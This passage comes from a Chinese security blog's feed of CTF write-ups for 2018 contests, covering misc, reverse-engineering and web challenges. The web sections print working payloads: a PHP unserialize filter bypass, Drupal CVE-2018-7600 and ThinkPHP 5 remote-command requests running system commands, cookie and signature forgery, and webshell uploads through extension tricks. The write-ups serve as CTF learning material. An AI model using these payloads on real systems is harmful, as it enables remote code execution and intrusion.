id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>先开始图片给错了。。。尝试各种姿势无果，后来新给的图片，binwalk -e 一下就会看到有个2.txt文件，打开发现是个png头，于是修改后缀名为png<br>可以得到如图一张图片<br><img src="/2018/12/23/zhongyuan/misc.jpg" alt=" "><br>把上面的字符记下来<code>qebcf{nfqs25kjps8rjsi8kfqnfp42kizaoip}</code>，不过这不是真flag，flag需要drops开头，想到凯撒移位<br><img src="/2018/12/23/zhongyuan/misc1.jpg" alt=" "><br>得到<code>drops{asdf25xwcf8ewfv8xsdasc42xvmnbvc}</code></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p><a href="https://pan.baidu.com/s/1b_JMVA1Zb_U0ZlXnnLlcgg" target="_blank" rel="noopener">https://pan.baidu.com/s/1b_JMVA1Zb_U0ZlXnnLlcgg</a> 提取码：dfk1<br>本题主要在于二叉树的构造，得出要选出的节点的红黑值，根据要求进行ASCII码的运算即可得出flag。<br><img src="/2018/12/23/zhongyuan/re1.jpg" alt=" "><br>打开试题的README.txt文件,可以看到一段base64编码的密文，使用base64解码<br><img src="/2018/12/23/zhongyuan/re2.jpg" alt=" "><br>得到明文如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.这是一棵红黑树</span><br><span class="line">2.树从1-59上的果子依次为 1ek`~3c:ef017b744/b38fd~abm7g5489e2|lo|z8d16haen98&#125;bt-21s.e:</span><br><span class="line">3.依次从树上取走第 18,35,53,50,14,28,19,6,54,36 个果子,过程中保持红黑树性质不变</span><br><span class="line">4.tmpflag为第 8,56,47,37,52,38,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23 个果子</span><br><span class="line">5.flag为 tmpflag 红色果子 ASCII +1 , 黑色果子 ASCII-1</span><br><span class="line">6.让我们愉快的开始获取flag吧</span><br></pre></td></tr></table></figure></p><p>按照规则3对题目给的红黑树进行节点的删除（可以在线生成红黑树）试验一下，按层生成红黑树然后删除相应地节点得到8,56,47,37,52,38,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23这些节点的红（r表示）黑（b表示）值是bbrrbbrbbbbrbrbrbbrbrrbrrbbbrbbbrbrrrrbrbb</p><p>编写脚本进行输出就可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">    string s=&quot;1ek`~3c:ef017b744/b38fd~abm7g5489e2|lo|z8d16haen98&#125;bt-21s.e:&quot;; </span><br><span class="line">    int n[60]=&#123;8,56,47,37,52,38,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23&#125;;</span><br><span class="line">    string s1=&quot;bbrrbbrbbbbrbrbrbbrbrrbrrbbbrbbbrbrrrrbrbb&quot;;</span><br><span class="line">    int i=0;</span><br><span class="line">    while(i&lt;42)&#123;</span><br><span class="line">        char t;</span><br><span class="line">        switch(s1[i])&#123;</span><br><span class="line">            case &apos;r&apos;:t=s[n[i]]+1;break;</span><br><span class="line">            case &apos;b&apos;:t=s[n[i]]-1;break;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;t;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/12/23/zhongyuan/re3.jpg" alt=" "><br>得到flag，把<code>/</code>替换成<code>-</code>即可</p><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>这个题。。。原题，直接贴链接<br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=813470&amp;extra=page%3D1&amp;page=1" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=813470&amp;extra=page%3D1&amp;page=1</a></p><p>本次比赛题目有的题真的有点意思（为没做出来的web500打call）菜鸡还得加油鸭</p>]]></content>
    
    <summary type="html">
    
      2018中原工学院校赛
    
    </summary>
    
      <category term="Writeup" scheme="http://bobosec.top/categories/Writeup/"/>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>安恒十二月月赛题解</title>
    <link href="http://bobosec.top/2018/12/22/anheng-12/"/>
    <id>http://bobosec.top/2018/12/22/anheng-12/</id>
    <published>2018-12-22T06:14:05.000Z</published>
    <updated>2018-12-22T09:59:00.176Z</updated>
    
    <content type="html"><![CDATA[<p>想好好打一次安恒的月赛，而且据说这次比较简单</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><p>这个上来就是代码审计（php菜的扣脚的我慢慢百度）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">@error_reporting(1); </span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if(isset($this-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">if (isset($_GET[&apos;data&apos;]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[&apos;data&apos;];</span><br><span class="line">    preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;Hacker!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(&quot;./index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><br>这一段代码话可以。。不是太难。我们需要定位到关键函数<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches);</code><a href="http://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">点击此处</a><br>还有反序列化，参开这个文章：<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a><br>只需要在对象长度前添加一个<code>+</code>号，即<code>让o:4</code>变成<code>o:+4</code>，这样就可以绕过正则匹配<br>So，最后payload：<code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>但是一定要url编码一下再传进去<br><code>data=%4f%3a%2b%34%3a%22%62%61%62%79%22%3a%31%3a%7b%73%3a%34%3a%22%66%69%6c%65%22%3b%73%3a%38%3a%22%66%6c%61%67%2e%70%68%70%22%3b%7d</code><br><img src="/2018/12/22/anheng-12/1.jpg" alt=" "></p><h2 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h2><p>这个题目一打开并没有发现什么，所以我们扫一下后台，得到了<code>admin.php</code><br>但进去以后<br><img src="/2018/12/22/anheng-12/2.jpg" alt=" "><br>提示我们并不是admin，我们抓包看到<br><img src="/2018/12/22/anheng-12/3.jpg" alt=" "><br>这个user我们解码得到<code>user</code>所以我们的思路就是改一下cooikes，改成admin，base64编码一下<code>YWRtaW4=</code><br>题目对我不太友好、、、好几遍都进不去<br><img src="/2018/12/22/anheng-12/4.jpg" alt=" "><br>进去以后是个网站后台管理，可以访问一些文件<br><img src="/2018/12/22/anheng-12/5.jpg" alt=" "><br>试一下admin.php<br><img src="/2018/12/22/anheng-12/6.jpg" alt=" "><br>再读一下config.php，发现有过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function waf_exec($str)&#123;</span><br><span class="line">$black_str = &quot;/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i&quot;;</span><br><span class="line">$str = preg_replace($black_str, &quot;&quot;,$str);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>很多符号都被过滤了，但是“$”,“/”没被过滤，所以可以匹配一下啦。<br>首先ls一下看看<br><img src="/2018/12/22/anheng-12/7.jpg" alt=" "><br><code>IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</code><br><img src="/2018/12/22/anheng-12/8.jpg" alt=" "></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接给公众号发：蜗牛，再喊一句口号就行了</p><h2 id="juju"><a href="#juju" class="headerlink" title="juju"></a>juju</h2><p>打开压缩包发现是个超大png，结果binwalk以后发现一堆乱七八糟的，所以只好改一下图片高度试试<br>图片高度改成1080就好</p>]]></content>
    
    <summary type="html">
    
      安恒12月月赛
    
    </summary>
    
      <category term="Writeup" scheme="http://bobosec.top/categories/Writeup/"/>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>中国矿业大学第一次双月赛题目解析</title>
    <link href="http://bobosec.top/2018/12/16/cumt-match/"/>
    <id>http://bobosec.top/2018/12/16/cumt-match/</id>
    <published>2018-12-16T14:48:57.000Z</published>
    <updated>2018-12-18T09:54:16.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p><img src="/2018/12/16/cumt-match/ez1.jpg" alt=" "><br>打开题目发现是个上传webshell，所以我们想到上传一个木马，getshell，拿flag<br>这里需要用到BP还有一句话木马，不懂得可以百度一下<br><img src="/2018/12/16/cumt-match/ez2.jpg" alt=" "><br>这是我们的一句话木马上传，然后我们发现php后缀不能执行，所以我们得改一下后缀，经过测试发现，后缀为<code>php5</code>和<code>phtml</code>时可以执行<br><img src="/2018/12/16/cumt-match/ez3.jpg" alt=" "><br>这时候改完后缀我们发现上传成功，于是可以直接连中国菜刀（不懂百度中国菜刀就行）<br><img src="/2018/12/16/cumt-match/ez4.jpg" alt=" "><br>配置成功<br>直接去根目录读flag就行<br><img src="/2018/12/16/cumt-match/ez5.jpg" alt=" "></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>既然题目说了CVE，打开发现有一个power by<br><img src="/2018/12/16/cumt-match/cve1.jpg" alt=" "><br>于是就找这个框架的漏洞就行，payload 分为两个请求。 先将 Payload 注入缓存中，构造下面的payload，发送一个POST包<br><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">drupal7~8 CVE-2018-7600</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=user/password&amp;name[%23post_render][]=system&amp;name[%23markup]=cat%20../../../../../flag&amp;name[%23type]=markup HTTP/1.1</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure></p><p>这里注意一下参考文章里面的passthru命令用不了，只能改为system才能执行相关命令,所以上面缓存的时候换了用system函数<br><img src="/2018/12/16/cumt-match/cve2.jpg" alt=" "><br>在响应中找到form_build_id的值然后继续请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=file/ajax/name/%23value/form-qpnIm9H756D90crsuz61R9WE5xD4nsk6rqzUJ5cGRNU HTTP/1.1</span><br><span class="line"></span><br><span class="line">form_build_id=form-qpnIm9H756D90crsuz61R9WE5xD4nsk6rqzUJ5cGRNU</span><br></pre></td></tr></table></figure></p><p>再来一次cat /flag的操作就可以读取flag了<br><img src="/2018/12/16/cumt-match/cve3.jpg" alt=" "></p><h3 id="secret-system"><a href="#secret-system" class="headerlink" title="secret-system"></a>secret-system</h3><p><img src="/2018/12/16/cumt-match/system1.jpg" alt=" "><br>一进去之后会发现login功能没反应，而upload页面也需要管理员权限，肯定是要伪造自己是管理员的身份然后去挖掘文件上传的漏洞，查看源代码无果后顺手看看robots.txt,发现里面有登录的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br><span class="line">然后就可以进去登陆的页面，再次查看源代码发现作者的信息</span><br><span class="line">&lt;!-- </span><br><span class="line">*** author: cib_zhinianyuxin.com </span><br><span class="line">*** code: github.com </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><br>找到执念于心学长的github里项目的介绍</p><blockquote><p>It’s just a system which is not completed , there are some tips:</p><ol><li>you can use test/cib_sec to login ,but you are not admin!</li><li>only admin can upload file ,but whichone can not bypass my rules.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;/**</span><br><span class="line">&gt;$sign = array(</span><br><span class="line">&gt;                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">&gt;                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">&gt;                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">&gt;                );</span><br><span class="line">&gt;$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">&gt;**/</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>查一下,发现可以用用户名：test 密码：cib_sec登录但不是admin，而且泄露的代码里面说明了可以伪造cookie，cookie名称是Cib_security，是一段经过序列化的东西，到时候就可以伪造了<br>以test身份登录后把cookie拿出来然后解码<br><img src="/2018/12/16/cumt-match/system2.jpg" alt=" "><br>然后把里面的MD5解一下发现是2test,那我们就构造一个1admin，构造如下的序列<br>a:3{s:2:”id”;i:1;s:4:”name”;s:5:”admin”;s:4:”sign”;s:32:”6c5de1b510e8bdd0bc40eff99dcd03f8”;}<br>然后需要url编码一下，保存一下cookie就可以以admin身份登录，接上来就是文件上传的部分了，这里的文件上传就是个很简单的后缀名绕过,这个后缀名有点偏，用的<code>pht</code>（和phtml差不多的东东）,然后发包上传一句话木马，菜刀链接，成功获取flag<br><img src="/2018/12/16/cumt-match/system3.jpg" alt=" "></p><h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><p><img src="/2018/12/16/cumt-match/shop1.jpg" alt=" "><br>这个是安恒10月月赛原题改编（话说这个改的真的太坑了）<br>这个题给了源码，先把源码给下载下来<br>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要888积分才可以购买，这个时候就感觉应该是越权购买flag<br>发现源码里面有数据库文件打开看一下，发现是存在管理员的<br><img src="/2018/12/16/cumt-match/shop2.jpg" alt=" "><br>并且id是16，而且他有30000积分，够买很多flag了，还有商品id 38也可以得知<br><img src="/2018/12/16/cumt-match/shop3.jpg" alt=" "><br>看到代码里面的setting文件，有从secret.key读出来的秘钥<code>zhinianyuxin/n</code>（这个回车害死多少人）<br><img src="/2018/12/16/cumt-match/shop4.jpg" alt=" "><br>看一下这一段代码<br><img src="/2018/12/16/cumt-match/shop5.jpg" alt=" "><br>这里可以看出单单对商品方做了校验(自检验)那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱<br>根据它里面的代码去构造signature就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5 </span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = &apos;zhinianyuxin\n&apos; </span><br><span class="line">form = &#123; </span><br><span class="line">&apos;order_id&apos;: &apos;119&apos;, </span><br><span class="line">&apos;buyer_id&apos;: &apos;16&apos;,   </span><br><span class="line">&apos;good_id&apos;: &apos;38&apos;,    </span><br><span class="line">&apos;buyer_point&apos;: &apos;200&apos;, </span><br><span class="line">&apos;good_price&apos;: &apos;50&apos;, </span><br><span class="line">&apos;order_create_time&apos;: &apos;1544796662.686132&apos; </span><br><span class="line">&#125; </span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + &apos;&amp;&apos;.join([f&apos;&#123;i&#125;=&#123;form[i]&#125;&apos; for i in form]) </span><br><span class="line">str2sign3= str2sign.encode(&apos;utf-8&apos;) </span><br><span class="line">sign = md5(str2sign3).hexdigest() </span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure><br>python脚本，跑一下就行<br>发包构造一下得到flag,注意红色的地方也要做相应的修改，发包得到flag<br><img src="/2018/12/16/cumt-match/shop6.jpg" alt=" "></p><h3 id="TP5"><a href="#TP5" class="headerlink" title="TP5"></a>TP5</h3><p><img src="/2018/12/16/cumt-match/TP1.jpg" alt=" "><br>因为题目说了：version is 5.0.22 ，所以想到thinkpho最近几天刚爆出来的tp5远程getshell的漏洞，直接上网搜payload，参考了这篇文章:<a href="https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig</a><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><br><img src="/2018/12/16/cumt-match/TP2.jpg" alt=" "><br>发现有回显<br>列一下文件看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../.././../../.././</span><br></pre></td></tr></table></figure><br><img src="/2018/12/16/cumt-match/TP3.jpg" alt=" "><br>发现有flag在根目录<br>最后获取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure></p><h3 id="shell"><a href="#shell" class="headerlink" title="shell?"></a>shell?</h3><p>这个题目由于特殊原因不能写的太详细，不过慢慢研究也能A了<br>这个题目上来注册进去发现只有一个上传的功能，尝试了一下发现不是普通的上传绕过的问题，于是随手测试了一下admin路径，居然真的有。。。然后这时候确定了用户名是admin，密码我们爆破一下（据说是我的字典比较秀，一下子就爆破出来了）密码是qwe123<br>登陆进去以后发现url是<code>file=</code>这个看着像文件包含，于是尝试读一下<code>etc/passwd</code>可以读到<br><img src="/2018/12/16/cumt-match/shell1.jpg" alt=" "><br>然后想的是直接读<code>upload.php</code>源码看一下过滤规则，但是！！发现了只要是包含<code>php</code>的都不行，大小写各种绕过也不行，走头无路、、、绝望.jpg<br>后面想可以利用刚刚普通用户上传的东西，然后去文件包含执行，于是就尝试了图片马，结果PHP的代码会被解析掉。。。。。<br>最后最后找到了各种奇奇怪怪的CTF姿势，终于！！！可以自己构造一个图片马，然后执行，再本地包含上去就直接被服务器解析了就行<br>然后就是常规操作，列目录拿flag（PS：难点在构造自己的php图片马，这次过滤真的tql、、、、）</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><blockquote><p>打的不好 re4没做出来<br>ak了密码学 但都挺简单的<br>打算慢慢退役算了 开学到现在其实都没在学23333</p></blockquote><h3 id="0x00-open-the-gate-of-RE"><a href="#0x00-open-the-gate-of-RE" class="headerlink" title="0x00 open the gate of RE"></a>0x00 open the gate of RE</h3><h4 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h4><p>一开始没找到关键的判断函数 程序也停不来下来<br>在下图地址处下断点 运行能看到关键的异或和判断汇编语句<br><img src="/2018/12/16/cumt-match/0x00-0.png" alt=""><br>动态调试 的样子<br><img src="/2018/12/16/cumt-match/0x00-1.png" alt=""></p><h4 id="流程概述"><a href="#流程概述" class="headerlink" title="流程概述"></a>流程概述</h4><ol><li>输入string</li><li>string按位与 <code>rdi</code> 里存的某一个值进行异或操作</li><li>运行到 <code>cmpsb</code>语句 和 程序内部的数据进行比较</li></ol><p>所以唯一不知道的就是 每次异或的那个值是啥<br>通过理清汇编的代码逻辑就能知道 rdi的值就是前一个字符的值</p><h4 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h4><ol><li>从倒数第二位开始 和后一位异或</li><li>并更新当前位的值</li></ol><h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=[0x17,0x12,0x1D,0x22,0x38,0x18,0x58,0x7E,0x2B,0x1C,0x04,0x59,0x6A,0x33,0x1F,0x2C</span><br><span class="line">,0x26,0x49,0x45,0x07,0x2D,0x39,0x2F,0x3B,0x47,0x41,0x2B,0x2D,0x17,0x13,0x13,0x17</span><br><span class="line">,0x47,0x50,0x3A,0x39,0x0A,0x4A,0x41,0x46,0x5C,0x7D]</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in range(len(a)-1,0,-1):</span><br><span class="line">    a[i-1]=a[i-1]^a[i]</span><br><span class="line">for i in a:</span><br><span class="line">    flag+=chr(i)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><code>ctf{Yay!_thl5_ls_y0ur_fIr5t_rever5e_fl&amp;g!}</code></p><h3 id="0x01-Fake"><a href="#0x01-Fake" class="headerlink" title="0x01 Fake"></a>0x01 Fake</h3><h4 id="前期分析-1"><a href="#前期分析-1" class="headerlink" title="前期分析"></a>前期分析</h4><p>输入的string经过固定的和伪随机数序列的异或后 在经过在经过下面函数的变换<br>动态调试才发现好像修改了got表 改了<code>memcmp</code>指向的地址 实际执行的是下图的函数<br><img src="/2018/12/16/cumt-match/0x01-1.png" alt=""><br><img src="/2018/12/16/cumt-match/check22.png" alt=""></p><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><ol><li>输入的数据和 伪随机序列<code>Rand=[0x3D,0x1D,0x42,0xA5,0x4D,0xEA,0xDD,0xAC,0x94,0xBF,0xF0,0x6E,0x0A,0xF8,0xB3,0xCD,0x8E,0xFE,0x7A,0xFF,0xCA,0xF9,0x17,0x91,0xFE,0x0A,0x3E,0x98,0xDF]</code> 异或</li><li>进入循环 每次减去 当前下标前面所有位数的程序内部数据之和</li><li>和程序内部数据判断</li></ol><h4 id="解密流程分析"><a href="#解密流程分析" class="headerlink" title="解密流程分析"></a>解密流程分析</h4><p>直接动态调试 提取出最终数据前一步的数据 和伪随机数序列进行异或操作</p><h4 id="解密脚本-1"><a href="#解密脚本-1" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Rand=[0x0d,0x2c,0x70,0x96,0x79,0xdf,0xeb,0x9b,0xac,0x86,0xc0,0x5f,0x38,0xcb,0x87,0xf8,0xb8,0xc9,0x42,0xc6,0xfb,0xcb,0x24,0xa5</span><br><span class="line">,0xcb,0x3c,0x09,0xa0,0xe6]</span><br><span class="line">a=[0x6B,0x65,0x17,0xE3,0x0B,0xBA,0xB4,0xAB,0xD9,0xF2,0x9F,0x37,0x09,0xA1,0xE6,0xBB</span><br><span class="line">,0xD3,0x96,0x25,0x89,0x8F,0x94,0x02,0xCB,0xAF,0x63,0x7A,0xCD,0xA5]</span><br><span class="line">for i in range(0,29):</span><br><span class="line">    flag+=chr(a[i]^Rand[i])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><code>fIgure_0ut_h1jaCk_gOt_&amp;nd_smC</code></p><h3 id="easy-Algorithm"><a href="#easy-Algorithm" class="headerlink" title="easy Algorithm"></a>easy Algorithm</h3><h4 id="前期分析-2"><a href="#前期分析-2" class="headerlink" title="前期分析"></a>前期分析</h4><p>主要函数如下图 一开始 把输入的 16位<code>s</code>按四位分成四段 分别进行<code>40083C</code>函数和strtol()函数<br><img src="/2018/12/16/cumt-match/33-1.png" alt=""></p><p><code>40083C</code>里的函数有MD5算法的初始值 暂判断为MD5算法<br><br>通过动态调试 提取结果确定就是md5算法<br><img src="/2018/12/16/cumt-match/0x02-0.png" alt=""></p><p>if里一共有五次判断 第一处是对输入的s的四段的大小 判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return a1 &lt; a2 &amp;&amp; a2 &lt; a3 &amp;&amp; a3 &lt; a4 &amp;&amp; a1 &gt; 999 &amp;&amp; a2 &gt; 999 &amp;&amp; a3 &gt; 999 &amp;&amp; a4 &gt; 999;</span><br></pre></td></tr></table></figure><p>接下来<code>400BBE</code>函数 是四段flag 每段都判断一次<br><img src="/2018/12/16/cumt-match/33-2.png" alt=""></p><h4 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h4><ol><li>输入string 分成4*4段 s1 s2 s3 s4</li><li>每段进行MD5计算 得到 m1 m2 m2 m3</li><li>把输入的四段 s1-4 转成数字 得到 a1 a2 a3 a4</li><li>if里的第一个判断 要满足 <code>a1 &lt; a2 &amp;&amp; a2 &lt; a3 &amp;&amp; a3 &lt; a4 &amp;&amp; a1 &gt; 999 &amp;&amp; a2 &gt; 999 &amp;&amp; a3 &gt; 999 &amp;&amp; a4 &gt; 999</code> 所以输入的是 不能以0开头 且 每段递增 的四段四位数字</li><li>将 四段数字 和 计算得到MD5值 作为参数 进入<code>400BBE</code>函数<br>运算判断返回值</li></ol><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>所以完全可以四位四位爆破遍历 满足<code>400BBE</code>函数的输入<br></p><ol><li>遍历<code>1000-9999</code> 的4位数</li><li>计算对应的MD5</li><li>改写<code>400BBE</code>函数 判断参数为4位数和对应的MD5值时 最后的返回值是否为1</li></ol><h4 id="爆破脚本"><a href="#爆破脚本" class="headerlink" 